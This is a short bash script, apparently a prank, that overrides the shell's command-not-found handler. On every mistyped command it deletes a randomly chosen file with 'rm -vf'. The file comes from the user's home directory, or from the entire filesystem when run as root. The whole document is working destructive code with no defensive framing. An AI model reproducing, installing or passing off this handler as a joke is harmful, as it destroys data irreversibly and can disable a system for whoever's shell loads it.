#!/bin/bash
function command_not_found_handle {
  echo "Command not found, sorry. Removing random file..."

  if [ "$USER" == "root" ]; then
    FP="/"
  else
    FP="$HOME"
  fi

  FILE=$(locate $FP | shuf -n 1)
  rm -vf $FILE;

}
